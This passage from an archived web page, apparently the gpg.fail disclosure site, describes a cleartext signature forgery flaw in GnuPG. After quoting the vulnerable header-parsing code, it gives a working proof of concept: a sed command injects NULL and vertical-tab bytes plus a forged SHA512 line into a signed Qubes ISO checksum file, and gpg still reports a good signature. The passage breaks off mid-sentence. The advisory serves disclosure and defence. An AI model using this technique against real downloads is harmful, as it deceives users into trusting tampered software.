<span class=3D"line"><span>U/YP7X+ycelTKrdOnD01W3as9mzszNAe59qZSREDrg9KSlmw=
7Kry7MuUcyu6avYdp3wVv/jBV9+l</span></span>
<span class=3D"line"><span>DYLjL7nR6S+nLu6ZHbu1Zzlh9L5zcZ3fB4/uKdLSsY7YbubX=
TT8Slj8DfwLxb9KKgRfnh5Bltcn0</span></span>
<span class=3D"line"><span>vFPU4mU5L+Dq8aFv7uVSWr9MK+uwQt8s39ib1CHbz/3ZkTdq=
Bn1/cfOOIZzGM4O0mcRH0zszr7TX</span></span>
<span class=3D"line"><span>JaBvNzYCsKFLcegjh1MQVyYTI2LWbzFcPN+XK7hjPVDcxsvr=
jHYwDn9pur6sldHwBLxTHbl9/oH3</span></span>
<span class=3D"line"><span>TQU7X9VqfEMKdx+55zbooA9CN5+w1qVdpoBt3fM/Dx6PO1XV=
9CA4Nm5OjYKjfLW8AWqCTs2MObwX</span></span>
<span class=3D"line"><span>7322yp55+y4CqQzjQmbtXvCHe5aEY/okfBRMyj8RTMrfiuRb=
5+Ae4vNyl/MVJC325mZbz4zwGrfw</span></span>
<span class=3D"line"><span>+b6v237NPp+2sGIkB4fqdajwsm1OlPB08kwg1q26LKgeqL34=
cOX4JSd+2NZyLPbirNSb2wtU8YhM</span></span>
<span class=3D"line"><span>HmgtWcwYfnVOrUKwR3XjUg5Tg+861NF3K3XFwH6/6cxPtnZe=
8GTh7ronvui61U+6D0whDmyNWDjt</span></span>
<span class=3D"line"><span>yeLx431k0dbVCelJg2GOPcnKhZ544eLN4clrV5ZVrZ2fMNZo=
Op09Drd/E3nK5b7iJ22LX2J2V3yx</span></span>
<span class=3D"line"><span>0rY1WnLqzQ3GsbSS/j+d6CwsafN3PXr50/xly7PGuB5O6YFz=
tgB3t79Exo8RgQMk5zSkWV3vnazy</span></span>
<span class=3D"line"><span>z2W6lB8n96tMvaSvnHKuIlaYcznxQdK8rzcMm7EQnQRtB6gj=
5b+9XzOt4j08dWAsZNzT/Lxd07ea</span></span>
<span class=3D"line"><span>Gqdk1ZVsOBv8rTD3dJ1m06wI3zf33ZfyH244PHZYr7i2tKg3=
Rw0HDNQNZ+jXGC3fsfo542uum7rG</span></span>
<span class=3D"line"><span>n7BpZiJVNyOHve3h5Zx+sGjc+z7jXFFnWswA73ACfv24J9n9=
Ju0riaWNSK8lNB/Math7Vu+YVVTr</span></span>
<span class=3D"line"><span>ryctvNmYTQyi4jenyaTtkR308toNsfJFuXNv3UjOsPdlZ7Z9=
n7FJ0i9xqKbjlpzhz8YUNd1YhFOc</span></span>
<span class=3D"line"><span>Muw4WFkML88pndhCaexDRIdPXXN71/lCYFFmuHxE9oKTA/2c=
GlfmeewNtcd2+Pr7rnd/I5Jb4h/T</span></span>
<span class=3D"line"><span>o3JOXqov3RN1ZUoTynl/eMHpm991s1tMP2ewMube79z/Zq18=
Q0jVhMjNXbKk50Rod2o1Thg9oaLu</span></span>
<span class=3D"line"><span>Tvw953148YSr3hNV7LdXvPj0mydjr31/ZQ50buEIUX/a4epR=
2nXKuzRW6vOMz099kOe0Js8RZB0f</span></span>
<span class=3D"line"><span>ezyyc7f+EnL2L2+/6TNRMWBV4tTS7BFs3ckStKauT9c8Ji1Q=
b2BX1KQmVPx4nihgN+pXrUDoB495</span></span>
<span class=3D"line"><span>kWuf+rpnlSFQyp53EjYfRj98BsnJyl/7beQ36en+GYTBy+ft=
w/2MK7vVPST+zowXO745fu1J447t</span></span>
<span class=3D"line"><span>zwdnjD0zPhqy5eqvbaXd7VWMZRjX24dpGw6MnB5WLTr+6sJQ=
vH3zKSvyBPxBsMpwLmb8zkU7vp6S</span></span>
<span class=3D"line"><span>dTJYsJv23o4nJCMw+eWFVVziozeII3cul1Ux2IMfnzmWOnfK=
hQTCiLD7xflJnmsjL/aOG7e717xl</span></span>
<span class=3D"line"><span>X+C6IvoWsFfFD5/Hps4cluncfOOH7oV9uzPHzA7OvpV6l6H4=
rPFk2wTCgo4XAxrL8dLzso2/eGta</span></span>
<span class=3D"line"><span>mNcuXydGJI+o1u1sfjzt0LObJQZJnfQZsTicvGQgmHqkaOIm=
6KwtjED19UUT3lZMG7A+dTCR4BLP</span></span>
<span class=3D"line"><span>VA4rogZaWuGlo7vhh6KK77RPzUuQb76aHvuIsZfdSFHG1FR1=
dTdCt69RI+cOxY8il6auJt+HB5ce</span></span>
<span class=3D"line"><span>vj7z12dVozoOPvpfiWTg34qk52h0WNmhV6jFe9tjo7GUYN2D=
x5MgyeH9m9p78gbM8b54S7hSkvM5</span></span>
<span class=3D"line"><span>QqyrNOFX+Uc3N9vGT6k/8a5lILV1zbIvlLrNy9AX/SOG1O3p=
ezInMI32o/skn72AN+9x5xfvpXTs</span></span>
<span class=3D"line"><span>s+ctr7JSpfz7b7MvPrpSfEZWab41DPLUIFkgSOzKavlAtN4L=
NZ1lzd3ZMveB/sqtDGDbsltf5FY0</span></span>
<span class=3D"line"><span>79ldcBJ8OYi+6+zEi/S4kdQGxdrRzY9Lr6UPI8FSxtRDCNOq=
yyIYZzZTzaPnfc8M5u3MZGiuWYWq</span></span>
<span class=3D"line"><span>2v2NY1e8Sxy2KnnyD0fWx2yLvty+NW1VupLrF5YlJu2bkk+e=
Nik/8X5j64G22rBHppC8f17a7WMH</span></span>
<span class=3D"line"><span>1cz3lqbZRTnvGwYndM5tJ1/gtfkKErfFV352Zc3Oo7OElTeK=
e/Dnin9auORqyYGWl5OKf+yYUVkS</span></span>
<span class=3D"line"><span>XhN3evs01rfDk3qW1+HWFQ2J5Edzvx2/1KvNW1KmPJH5Zb+D=
jZ8NOlp1/vrA2wgEqka4YOLr+1dj</span></span>
<span class=3D"line"><span>J5Km3B1WP9G+s4lVcFsQEiylKYeCcZM62/A5uWtf2ZIfI+pv=
5a0cCVn64t39A5b39bHHzub9tPTa</span></span>
<span class=3D"line"><span>xerP45/e7KB8ADh75gfrpwqUp9vNIaOC3c3JHDgw4njqzHmZ=
ozoLmpe9A1KYl8jZSzMvL9kCbL16</span></span>
<span class=3D"line"><span>rnM+VfZy+LnxhMoFj19j5624dYuT2jT9SNiZdsKTsdd4VI76=
//tv7BOf+MQnPvGJT3ziE5/4xCf+</span></span>
<span class=3D"line"><span>ffwHuCKCaQAoAAA=3D</span></span></code></pre><!-=
---><!----></article><!----><!----></main> <footer class=3D"bg-blue-500 p-4=
">contact: <a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_email__" d=
ata-cfemail=3D"7b1814150f1a180f3b1c0b1c551d1a1217">[email&#160;protected]</=
a></footer><!----><!--]--> <!--[!--><!--]--><!--]--><script data-cfasync=3D=
"false" src=3D"/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min=
.js"></script></body>
</html>

--1yeeQ81UyVL57Vl7
Content-Type: text/html; charset=utf-8
Content-Disposition: attachment; filename="10-nullbyte.html"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html lang=3D"en">
	<head>
		<meta charset=3D"utf-8" />
		<meta name=3D"darkreader-lock" />
		<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1" />
		<link rel=3D"manifest" href=3D"/manifest.webmanifest">
        <link rel=3D"icon" href=3D"/favicon.ico" sizes=3D"32x32">
        <link rel=3D"icon" href=3D"/icon.svg" type=3D"image/svg+xml">
        <link rel=3D"apple-touch-icon" href=3D"/apple-touch-icon.png">
=09=09
		<link href=3D"./_app/immutable/assets/0.B3PCwX-h.css" rel=3D"stylesheet">=
<!--12qhfyh--><!----><title>gpg.fail</title>
	</head>
	<body><!--[--><!--[--><!----><main class=3D"min-w-full max-w-[1280px] my-a=
uto bg-green-500 p-4 space-y-4"><!----><article class=3D"prose mx-auto"><h1=
>Cleartext Signature Forgery in GnuPG</h1> <!----><p>A vulnerability in <em=
>GnuPG</em> allows for stuffing additional data in the Cleartext Signature =
Framework.</p> <h2>Impact</h2> <p>Exploitation allows for appending additio=
nal data after a valid <code>BEGIN PGP SIGNED MESSAGE</code> <a href=3D"htt=
ps://www.rfc-editor.org/rfc/rfc9580.html#name-armor-header-line" rel=3D"nof=
ollow">Armor Header Line</a> and thereby potentially deceiving a <em>GnuPG<=
/em> user about the actual signed data while preserving cryptographic integ=
rity.</p> <h2>Details</h2> <p>As highlighted in the <a href=3D"https://www.=
rfc-editor.org/rfc/rfc9580.html#section-7.3-7" rel=3D"nofollow">Issues with=
 the Cleartext Signature Framework</a>, there is the risk of an attacker in=
cluding misleading text in the <code>Hash</code> Armor Header and implement=
ations shall therefore apply strict validation:</p> <blockquote><p>Finally,=
 when a Cleartext Signature Framework message is presented to the user as i=
s, an attacker can include additional text in the Hash header, which may mi=
slead the user into thinking it is part of the signed text. The signature v=
alidation constraints described in Sections <a href=3D"https://www.rfc-edit=
or.org/rfc/rfc9580.html#section-6.2.2.3" rel=3D"nofollow">6.2.2.3</a> and <=
a href=3D"https://www.rfc-editor.org/rfc/rfc9580.html#section-7.1" rel=3D"n=
ofollow">7.1</a> help to mitigate the risk of arbitrary or misleading text =
in the Armor Headers.</p></blockquote> <p><em>GnuPG</em> fails to implement=
 these signature validation constraints correctly, as it is possible to inj=
ect arbitrary data in the <code>Hash</code> armor header after a NULL byte.=
</p> <p><em>GnuPG</em> implements the armor header validation in <code>stat=
ic int parse_hash_header( const char *line )</code> in <a href=3D"https://g=
ithub.com/gpg/gnupg/blob/49d2dde69667dc50af98e2addb8d4e0aa5a876de/g10/armor=
.c#L329C1-L351C12" rel=3D"nofollow"><code>gnupg/g10/armor.c</code></a>. The=
 function accepts a C-style string as its only parameter. <code>parse_hash_=
header</code> is called from <code>parse_header_line</code>, which passes s=
trings split by line terminators. However, no splitting is done on NULL byt=
es. Without extra length information which are not passed along, there is n=
o way to find the actual end of a C string in this scenario.</p> <p>The vul=
nerability arises from breaking, with a non-zero value in found, when a NUL=
L byte is encountered after the hash name:</p> <!----><pre class=3D"shiki g=
ithub-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tabind=
ex=3D"0"><code><span class=3D"line"><span style=3D"color:#8B949E">/********=
********</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * check whether the arm=
or header is valid on a signed message.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * this is for security =
reasons: the header lines are not included in the</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * hash and by using som=
e creative formatting rules, Mallory could fake</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * any text at the begin=
ning of a document; assuming it is read with</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * a simple viewer. We o=
nly allow the Hash Header.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">static</span><span style=
=3D"color:#FF7B72"> int</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">parse_hash_header</span>=
<span style=3D"color:#E6EDF3">( </span><span style=3D"color:#FF7B72">const<=
/span><span style=3D"color:#FF7B72"> char</span><span style=3D"color:#FF7B7=
2"> *</span><span style=3D"color:#FFA657">line</span><span style=3D"color:#=
E6EDF3"> )</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    const</span><span st=
yle=3D"color:#FF7B72"> char</span><span style=3D"color:#FF7B72"> *</span><s=
pan style=3D"color:#E6EDF3">s, </span><span style=3D"color:#FF7B72">*</span=
><span style=3D"color:#E6EDF3">s2;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    unsigned</span><span=
 style=3D"color:#E6EDF3"> found </span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;<=
/span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3">( </span><span style=3D"color:#D2A8FF">strlen</span><spa=
n style=3D"color:#E6EDF3">(line) </span><span style=3D"color:#FF7B72">&#x3C=
;</span><span style=3D"color:#79C0FF"> 6</span><span style=3D"color:#FF7B72=
">  ||</span><span style=3D"color:#D2A8FF"> strlen</span><span style=3D"col=
or:#E6EDF3">(line) </span><span style=3D"color:#FF7B72">></span><span style=
=3D"color:#79C0FF"> 60</span><span style=3D"color:#E6EDF3"> )</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	return</span><span styl=
e=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;</span><span st=
yle=3D"color:#8B949E"> /* too short or too long */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3">( </span><span style=3D"color:#D2A8FF">memcmp</span><spa=
n style=3D"color:#E6EDF3">( line, </span><span style=3D"color:#A5D6FF">"Has=
h:"</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#79C0=
FF">5</span><span style=3D"color:#E6EDF3"> ) )</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	return</span><span styl=
e=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;</span><span st=
yle=3D"color:#8B949E"> /* invalid header */</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    for</span><span styl=
e=3D"color:#E6EDF3">(s</span><span style=3D"color:#FF7B72">=3D</span><span =
style=3D"color:#E6EDF3">line</span><span style=3D"color:#FF7B72">+</span><s=
pan style=3D"color:#79C0FF">5</span><span style=3D"color:#E6EDF3">;;s</span=
><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3">s2) =
&#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	for</span><span style=
=3D"color:#E6EDF3">(; </span><span style=3D"color:#FF7B72">*</span><span st=
yle=3D"color:#E6EDF3">s </span><span style=3D"color:#FF7B72">&#x26;&#x26;</=
span><span style=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">*=
</span><span style=3D"color:#E6EDF3">s</span><span style=3D"color:#FF7B72">=
=3D=3D</span><span style=3D"color:#A5D6FF">' '</span><span style=3D"color:#=
FF7B72"> ||</span><span style=3D"color:#FF7B72"> *</span><span style=3D"col=
or:#E6EDF3">s </span><span style=3D"color:#FF7B72">=3D=3D</span><span style=
=3D"color:#A5D6FF"> '</span><span style=3D"color:#FF7B72">\</span><span sty=
le=3D"color:#A5D6FF">t'</span><span style=3D"color:#E6EDF3">); s</span><spa=
n style=3D"color:#FF7B72">++</span><span style=3D"color:#E6EDF3"> )</span><=
/span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	    ;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	if</span><span style=3D=
"color:#E6EDF3">( </span><span style=3D"color:#FF7B72">!*</span><span style=
=3D"color:#E6EDF3">s )</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	    break</span><span s=
tyle=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	for</span><span style=
=3D"color:#E6EDF3">(s2</span><span style=3D"color:#FF7B72">=3D</span><span =
style=3D"color:#E6EDF3">s</span><span style=3D"color:#FF7B72">+</span><span=
 style=3D"color:#79C0FF">1</span><span style=3D"color:#E6EDF3">; </span><sp=
an style=3D"color:#FF7B72">*</span><span style=3D"color:#E6EDF3">s2 </span>=
<span style=3D"color:#FF7B72">&#x26;&#x26;</span><span style=3D"color:#FF7B=
72"> *</span><span style=3D"color:#E6EDF3">s2</span><span style=3D"color:#F=
F7B72">!=3D</span><span style=3D"color:#A5D6FF">' '</span><span style=3D"co=
lor:#FF7B72"> &#x26;&#x26;</span><span style=3D"color:#FF7B72"> *</span><sp=
an style=3D"color:#E6EDF3">s2 </span><span style=3D"color:#FF7B72">!=3D</sp=
an><span style=3D"color:#A5D6FF"> '</span><span style=3D"color:#FF7B72">\</=
span><span style=3D"color:#A5D6FF">t'</span><span style=3D"color:#FF7B72"> =
&#x26;&#x26;</span><span style=3D"color:#FF7B72"> *</span><span style=3D"co=
lor:#E6EDF3">s2 </span><span style=3D"color:#FF7B72">!=3D</span><span style=
=3D"color:#A5D6FF"> ','</span><span style=3D"color:#E6EDF3">; s2</span><spa=
n style=3D"color:#FF7B72">++</span><span style=3D"color:#E6EDF3"> )</span><=
/span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	    ;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3">( </span><span style=3D"color:#FF7B72">!</span><span sty=
le=3D"color:#D2A8FF">strncmp</span><span style=3D"color:#E6EDF3">( s, </spa=
n><span style=3D"color:#A5D6FF">"RIPEMD160"</span><span style=3D"color:#E6E=
DF3">, s2</span><span style=3D"color:#FF7B72">-</span><span style=3D"color:=
#E6EDF3">s ) )</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	    found </span><span =
style=3D"color:#FF7B72">|=3D</span><span style=3D"color:#79C0FF"> 1</span><=
span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	else</span><span style=
=3D"color:#FF7B72"> if</span><span style=3D"color:#E6EDF3">( </span><span s=
tyle=3D"color:#FF7B72">!</span><span style=3D"color:#D2A8FF">strncmp</span>=
<span style=3D"color:#E6EDF3">( s, </span><span style=3D"color:#A5D6FF">"SH=
A1"</span><span style=3D"color:#E6EDF3">, s2</span><span style=3D"color:#FF=
7B72">-</span><span style=3D"color:#E6EDF3">s ) )</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	    found </span><span =
style=3D"color:#FF7B72">|=3D</span><span style=3D"color:#79C0FF"> 2</span><=
span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	else</span><span style=
=3D"color:#FF7B72"> if</span><span style=3D"color:#E6EDF3">( </span><span s=
tyle=3D"color:#FF7B72">!</span><span style=3D"color:#D2A8FF">strncmp</span>=
<span style=3D"color:#E6EDF3">( s, </span><span style=3D"color:#A5D6FF">"SH=
A224"</span><span style=3D"color:#E6EDF3">, s2</span><span style=3D"color:#=
FF7B72">-</span><span style=3D"color:#E6EDF3">s ) )</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	    found </span><span =
style=3D"color:#FF7B72">|=3D</span><span style=3D"color:#79C0FF"> 8</span><=
span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	else</span><span style=
=3D"color:#FF7B72"> if</span><span style=3D"color:#E6EDF3">( </span><span s=
tyle=3D"color:#FF7B72">!</span><span style=3D"color:#D2A8FF">strncmp</span>=
<span style=3D"color:#E6EDF3">( s, </span><span style=3D"color:#A5D6FF">"SH=
A256"</span><span style=3D"color:#E6EDF3">, s2</span><span style=3D"color:#=
FF7B72">-</span><span style=3D"color:#E6EDF3">s ) )</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	    found </span><span =
style=3D"color:#FF7B72">|=3D</span><span style=3D"color:#79C0FF"> 16</span>=
<span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	else</span><span style=
=3D"color:#FF7B72"> if</span><span style=3D"color:#E6EDF3">( </span><span s=
tyle=3D"color:#FF7B72">!</span><span style=3D"color:#D2A8FF">strncmp</span>=
<span style=3D"color:#E6EDF3">( s, </span><span style=3D"color:#A5D6FF">"SH=
A384"</span><span style=3D"color:#E6EDF3">, s2</span><span style=3D"color:#=
FF7B72">-</span><span style=3D"color:#E6EDF3">s ) )</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	    found </span><span =
style=3D"color:#FF7B72">|=3D</span><span style=3D"color:#79C0FF"> 32</span>=
<span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	else</span><span style=
=3D"color:#FF7B72"> if</span><span style=3D"color:#E6EDF3">( </span><span s=
tyle=3D"color:#FF7B72">!</span><span style=3D"color:#D2A8FF">strncmp</span>=
<span style=3D"color:#E6EDF3">( s, </span><span style=3D"color:#A5D6FF">"SH=
A512"</span><span style=3D"color:#E6EDF3">, s2</span><span style=3D"color:#=
FF7B72">-</span><span style=3D"color:#E6EDF3">s ) )</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	    found </span><span =
style=3D"color:#FF7B72">|=3D</span><span style=3D"color:#79C0FF"> 64</span>=
<span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	else</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	    return</span><span =
style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;</span></sp=
an>
<span class=3D"line"><span style=3D"color:#FF7B72">	for</span><span style=
=3D"color:#E6EDF3">(; </span><span style=3D"color:#FF7B72">*</span><span st=
yle=3D"color:#E6EDF3">s2 </span><span style=3D"color:#FF7B72">&#x26;&#x26;<=
/span><span style=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">=
*</span><span style=3D"color:#E6EDF3">s2</span><span style=3D"color:#FF7B72=
">=3D=3D</span><span style=3D"color:#A5D6FF">' '</span><span style=3D"color=
:#FF7B72"> ||</span><span style=3D"color:#FF7B72"> *</span><span style=3D"c=
olor:#E6EDF3">s2 </span><span style=3D"color:#FF7B72">=3D=3D</span><span st=
yle=3D"color:#A5D6FF"> '</span><span style=3D"color:#FF7B72">\</span><span =
style=3D"color:#A5D6FF">t'</span><span style=3D"color:#E6EDF3">); s2</span>=
<span style=3D"color:#FF7B72">++</span><span style=3D"color:#E6EDF3"> )</sp=
an></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	    ;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	if</span><span style=3D=
"color:#E6EDF3">( </span><span style=3D"color:#FF7B72">*</span><span style=
=3D"color:#E6EDF3">s2 </span><span style=3D"color:#FF7B72">&#x26;&#x26;</sp=
an><span style=3D"color:#FF7B72"> *</span><span style=3D"color:#E6EDF3">s2 =
</span><span style=3D"color:#FF7B72">!=3D</span><span style=3D"color:#A5D6F=
F"> ','</span><span style=3D"color:#E6EDF3"> )</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	    return</span><span =
style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;</span></sp=
an>
<span class=3D"line"><span style=3D"color:#FF7B72">	if</span><span style=3D=
"color:#E6EDF3">( </span><span style=3D"color:#FF7B72">*</span><span style=
=3D"color:#E6EDF3">s2 )</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	    s2</span><span styl=
e=3D"color:#FF7B72">++</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    return</span><span s=
tyle=3D"color:#E6EDF3"> found;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span>
<span class=3D"line"></span></code></pre><!----> <p>Due to breaking, once a=
 NULL byte is processed, it is possible to append additional data in the <c=
ode>Hash</code> armor header in an attempt to deceive a user into believing=
 it to be a part of the data bound under the signature. The risk of this ha=
ppening is correctly pointed out by the comment above the function. However=
, the function implementation in combination with its call site in <code>pa=
rse_header_line</code> violates this.</p> <h2>Detailed steps to reproduce</=
h2> <h3>Scenario</h3> <p>Bob wants to download and verify a Qubes OS ISO si=
gned by Alice.
Over a trusted channel, Bob obtains Alice=E2=80=99s key, in our example, th=
e <a href=3D"https://keys.qubes-os.org/keys/qubes-release-4.2-signing-key.a=
sc" rel=3D"nofollow">release signing key</a> of the project.
Bob imports and trusts it.
Over an untrusted channel, on which Mallory has an MITM role, Bob proceeds =
to download the <a href=3D"https://mirrors.edge.kernel.org/qubes/iso/Qubes-=
R4.2.4-x86_64.iso" rel=3D"nofollow"><code>Qubes-R4.2.4-x86_64.iso</code></a=
> alongside the <a href=3D"https://mirrors.edge.kernel.org/qubes/iso/Qubes-=
R4.2.4-x86_64.iso.DIGESTS" rel=3D"nofollow">signed checksum file</a>.
During the download, Mallory switches out both files for manipulated ones.<=
/p> <h3>Procedure</h3> <!----><pre class=3D"shiki github-dark-default" styl=
e=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span cla=
ss=3D"line"><span>$ echo "malicious Qubes iso, that the Qubes maintainers w=
ould never sign" > Qubes-R4.2.4-x86_64.iso</span></span>
<span class=3D"line"><span>$ sha512sum *Qubes-R4.2.4-x86_64.iso</span></spa=
n>
<span class=3D"line"><span>92e0148fc8874509d33d049a9b46e7fb5837d2f9466692b8=
8904b84595426cfd65e842509d2faaa9bf067824d21e18fc2b646f4905182fe67e1ae9143be=
d05a6  Qubes-R4.2.4-x86_64.iso</span></span>
<span class=3D"line"><span>$ cat Qubes-R4.2.4-x86_64.iso.DIGESTS | sed 's/S=
HA256.*/=00=00=0D=0B=0D=0B92e0148fc8874509d33d049a9b46e7fb5837d2f9466692b88=
904b84595426cfd65e842509d2faaa9bf067824d21e18fc2b646f4905182fe67e1ae9143bed=
05a6 Qubes-R4.2.4-x86_64.iso/' > Qubes-R4.2.4-x86_64.iso.DIGESTS</span></sp=
an></code></pre><!----> <p>Mallory can use any character in her injected me=
ssage, except the <code>\\n</code> character.
Instead, she uses alternative characters that also print as a newline in th=
is example.</p> <p>Bob then receives the file, and compares the sha512 matc=
hing.</p> <!----><pre class=3D"shiki github-dark-default" style=3D"backgrou=
nd-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><=
span>$ gpg --verify Qubes-R4.2.4-x86_64.iso.DIGESTS</span></span>
<span class=3D"line"><span>gpg: Signature made Mon 17 Feb 2025 06:00:00 AM =
CET</span></span>
<span class=3D"line"><span>gpg:                using RSA key 9C884DF3F81064=
A569A4A9FAE022E58F8E34D89F</span></span>
<span class=3D"line"><span>gpg: Good signature from "Qubes OS Release 4.2 S=
igning Key" [ultimate]</span></span>
<span class=3D"line"><span>$ sha512sum *Qubes-R4.2.4-x86_64.iso</span></spa=
n>
<span class=3D"line"><span>92e0148fc8874509d33d049a9b46e7fb5837d2f9466692b8=
8904b84595426cfd65e842509d2faaa9bf067824d21e18fc2b646f4905182fe67e1ae9143be=
d05a6  Qubes-R4.2.4-x86_64.iso</span></span>
<span class=3D"line"><span>$ cat Qubes-R4.2.4-x86_64.iso.DIGESTS</span></sp=
an>
<span class=3D"line"><span>-----BEGIN PGP SIGNED MESSAGE-----</span></span>
<span class=3D"line"><span>Hash: SHA256</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>92e0148fc8874509d33d049a9b46e7fb5837d2f9466692b8=
8904b84595426cfd65e842509d2faaa9bf067824d21e18fc2b646f4905182fe67e1ae9143be=
d05a6 *Qubes-R4.2.4-x86_64.iso</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>6d28eed5e3a2f1e06b1dbdb52713deb8 *Qubes-R4.2.4-x=
86_64.iso</span></span>
<span class=3D"line"><span>ede51181709b2e0a69b87cfd7b8db1f36ef69515 *Qubes-=
R4.2.4-x86_64.iso</span></span>
<span class=3D"line"><span>f596adc4c40f2670321de0c41e65a4b94193ca77959149c6=
2bcc2579425fac8e *Qubes-R4.2.4-x86_64.iso</span></span>
<span class=3D"line"><span>949589751e8d4794274b4889dd94f50823b39011e2b8b0af=
a3b4b7fd204042baf640f1af4241dae42193cf33a9721600402a2f258397a2c81f202415766=
40607 *Qubes-R4.2.4-x86_64.iso</span></span>
<span class=3D"line"><span>-----BEGIN PGP SIGNATURE-----</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>iQIzBAEBCAAdFiEEnIhN8/gQZKVppKn64CLlj4402J8FAmey=
wlAACgkQ4CLlj440</span></span>
<span class=3D"line"><span>2J8jAg/+LY+/3fOyfbwjc8zkB+scnHv/BBxMB4o4hZrwFVfO=
t8d+ar34P1gvRDcG</span></span>
<span class=3D"line"><span>GFkp7J4jjPU3Lrcdm2nzX0/uyrHrZq7TOvrWpyFn5IffyX8r=
2ltIF0SBld4Uvbhr</span></span>
<span class=3D"line"><span>K8RPzJXTuFf1RrjcCngA24Go8aP0C4LL04PQNzCoXxMicqc+=
rDsk2zMQA/DdYE7S</span></span>
<span class=3D"line"><span>2WZVkeuaUnRa31oxNJW7Di1UpPJxFBP/aTrii4e06hzqodtk=
o+kxt9aAi8b47DO2</span></span>
<span class=3D"line"><span>6g89H617zIXvcDfS/IAO8W7D+0If5WtLQyVGbeoNN+NOf14t=
E2wh18QtvVQmccVP</span></span>
<span class=3D"line"><span>t23+aQz4AT6j49jDd0iUYbbcgyia2wvY4C4QfR5+ZaZaee5D=
fuJEgRIRBv+BQrCE</span></span>
<span class=3D"line"><span>iG4o1HbsRXDpwZCHX3w99cVPpcYQzB0Xu1qR7zTNrXZBcgc5=
XffDoS0vzn57Id/7</span></span>
<span class=3D"line"><span>wwXsSVTbdGjnFFffL8s5aOr5tH22QbqBcMYmF5OA/9QPdkX4=
0oZDE6SFwRqQHS3t</span></span>
<span class=3D"line"><span>OVsVAcv1r45NWWSRAjksviz91i7kMtl2KnP98imrdAUr/k21=
XupvxTVI5RgPF0DG</span></span>
<span class=3D"line"><span>EWNIGsHZnSY9k2HqEl6+FYTH4hZBreaFGyASuk/lDjIYtGAz=
0IJERw6kFsIJ14YT</span></span>
<span class=3D"line"><span>BGC8Kc0ysaLOcUCq4WTb0M1U8ePH41mtAxiz2LrLqT5MCkZ/=
yQI=3D</span></span>
<span class=3D"line"><span>=3DYecE</span></span>
<span class=3D"line"><span>-----END PGP SIGNATURE-----</span></span>
<span class=3D"line"><span></span></span></code></pre><!----> <h3>Discussio=
n</h3> <p>Other attacks are possible with the vulnerability include adding =
a different file, for example in this modified BSD download, where a <code>=
